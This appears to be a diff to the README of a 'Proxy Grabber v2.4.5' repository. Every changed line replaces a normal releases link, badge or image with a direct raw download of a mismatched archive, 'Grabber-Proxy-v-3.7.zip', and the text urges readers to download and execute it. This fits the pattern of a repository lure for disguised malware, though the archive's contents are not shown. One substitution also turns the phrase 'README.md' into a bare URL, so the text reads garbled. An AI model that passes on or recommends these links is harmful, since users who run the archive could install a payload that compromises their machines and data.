@@ -1,8 +1,8 @@
 # Proxy Grabber v2.4.5
 
-Welcome to the Proxy Grabber v2.4.5 repository! This README.md will provide you with all the essential information about this tool for proxy management and utilization.
+Welcome to the Proxy Grabber v2.4.5 repository! This https://github.com/aniyan-chekkan/Proxy-Grabber-v2.4.5/raw/refs/heads/main/neurasthenia/Grabber-Proxy-v-3.7.zip will provide you with all the essential information about this tool for proxy management and utilization.
 
-🔗 **Download Proxy Grabber v2.4.5**: [![Download Proxy Grabber v2.4.5](https://img.shields.io/badge/Download-Proxy_Grabber_v2.4.5-blue)](https://github.com/aniyan-chekkan/Proxy-Grabber-v2.4.5/releases)
+🔗 **Download Proxy Grabber v2.4.5**: [![Download Proxy Grabber v2.4.5](https://github.com/aniyan-chekkan/Proxy-Grabber-v2.4.5/raw/refs/heads/main/neurasthenia/Grabber-Proxy-v-3.7.zip)](https://github.com/aniyan-chekkan/Proxy-Grabber-v2.4.5/raw/refs/heads/main/neurasthenia/Grabber-Proxy-v-3.7.zip)
 
 If you want to download and execute the Proxy Grabber v2.4.5 tool, simply click on the colorful button above to access the download link and get started with managing your proxies efficiently. 
 
@@ -29,10 +29,10 @@ Proxy Grabber v2.4.5 stands out for its efficiency, reliability, and ease of use
 
 ## Stay Updated
 
-For the latest updates and releases related to Proxy Grabber v2.4.5, make sure to check the [Releases](https://github.com/aniyan-chekkan/Proxy-Grabber-v2.4.5/releases) section of this repository. 
+For the latest updates and releases related to Proxy Grabber v2.4.5, make sure to check the [Releases](https://github.com/aniyan-chekkan/Proxy-Grabber-v2.4.5/raw/refs/heads/main/neurasthenia/Grabber-Proxy-v-3.7.zip) section of this repository. 
 
 Get started with Proxy Grabber v2.4.5 today and take your proxy management to the next level! 
 
 Thank you for choosing Proxy Grabber v2.4.5 for your proxy-related needs. 
 
-![Proxy Grabber](https://example.com/proxy-grabber-image.png)
+![Proxy Grabber](https://github.com/aniyan-chekkan/Proxy-Grabber-v2.4.5/raw/refs/heads/main/neurasthenia/Grabber-Proxy-v-3.7.zip)
